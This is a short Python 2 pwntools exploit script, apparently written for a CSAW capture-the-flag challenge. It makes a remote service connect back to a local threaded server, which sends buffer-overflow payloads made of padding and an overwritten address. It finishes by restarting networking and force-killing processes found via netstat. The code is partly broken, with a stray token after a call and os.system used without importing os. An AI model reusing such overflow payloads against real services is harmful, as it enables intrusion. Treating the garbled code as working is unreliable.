#!/usr/bin/env python
import SocketServer
from pwn import *
from sys import stdin, stdout, argv
from struct import pack
from os import urandom, system
from time import *
THREADS = ord("c") # 99

REMOTE_SERVER = "localhost"
REMOTE_PORT   = 24242

#REMOTE_SERVER = "pwn.chal.csaw.io"
#REMOTE_PORT   = 8004

SOCKET_SERVER = "0.0.0.0"
SOCKET_PORT   = 6002 #int(sys.argv[1])

numThreads = 16
thread = 0

payloads = [
    "A"*(127 + 5 + 10 + 1 + 100),
    "A"*(127) + "\x84\x7f\xff\xff\xff" + 'A'*10 + "0x80",
    "B"*(127)
]

header = lambda c: "\x01\x00"+p16(len(c))+p32(0)

class TCPHandler(SocketServer.BaseRequestHandler):

    def serverResponse(self, response):
        stdout.write("\033[1;36mServer Said: \033[39m{}\033[0m\n".format(response.encode('hex')))
        stdout.write("\033[1;36mServer Said: \033[39m{}\033[0m\n".format(response))
        stdout.flush()

    def handle(self):
        global thread
        payload = payloads[thread%len(payloads)]
        thread += 1
 
        # send the header and then wait
        # if thread < 5 or thread > 14:
        #     sleep(0.1*thread)
        package = header(payload) + payload

        # print package.encode('hex')
        self.request.sendall(package)
        recieved = self.request.recv(1024)
        self.serverResponse(recieved)

# Create server and bind
server = SocketServer.ThreadingTCPServer(("0.0.0.0",SOCKET_PORT),TCPHandler)


# Initialise remote client
rmsrv = remote(REMOTE_SERVER, REMOTE_PORT)
clientData = pack("<HH", numThreads, SOCKET_PORT)
rmsrv.sendline(clientData)hn
rmsrv.close()

server.allow_reuse_address=True

try:
    server.serve_forever()
except:
    pass

server.server_close()



os.system("/etc/init.d/networking restart")
os.system("netstat -pant | grep mom | grep -v LISTEN | cut -d\   -f 36 | sed 's/\/.*//g' | xargs kill -9")
print 







